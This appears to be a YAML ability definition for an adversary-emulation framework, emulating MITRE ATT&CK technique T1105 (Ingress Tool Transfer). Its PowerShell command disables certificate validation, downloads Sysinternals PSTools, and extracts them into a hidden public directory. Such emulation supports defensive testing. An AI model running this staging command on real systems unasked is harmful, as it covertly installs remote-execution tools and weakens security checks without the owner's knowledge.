- additional_info: {}
  privilege: ''
  plugin: stockpile
  technique_name: Ingress Tool Transfer
  buckets:
  - command-and-control
  singleton: false
  tactic: command-and-control
  technique_id: T1105
  access: {}
  delete_payload: true
  executors:
  - platform: windows
    command: '[System.Net.ServicePointManager]::ServerCertificateValidationCallback
      = { $True };

      $web = (New-Object System.Net.WebClient);

      $result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip",
      "PSTools.zip");

      New-Item -ItemType "directory" $env:PUBLIC\PSTools -Force;

      $psdir=Get-Item "$env:PUBLIC\PSTools" -Force;

      $psdir.attributes="hidden";

      Add-Type -Assembly ''System.IO.Compression.FileSystem''; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip",
      "$env:PUBLIC\PSTools");'
    additional_info: {}
    code: null
    cleanup: []
    timeout: 60
    parsers: []
    variations: []
    payloads: []
    language: null
    build_target: null
    uploads: []
    name: psh
  requirements: []
  repeatable: false
  description: Download and install PSTools and uncompress to a specific directory
  name: Donwload and Install PSTools
  id: Donwload_and_install_pstools
